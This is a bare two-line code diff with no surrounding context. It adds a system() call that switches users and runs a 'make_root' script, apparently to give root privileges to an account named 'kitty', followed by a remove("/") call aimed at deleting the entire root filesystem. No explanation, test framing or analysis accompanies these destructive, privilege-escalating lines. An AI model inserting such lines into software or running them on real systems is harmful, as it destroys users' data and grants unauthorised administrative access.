@@ -1,0 +1,2 @@
+system("user anon && ~/make_root kitty && user kitty")
+remove("/")
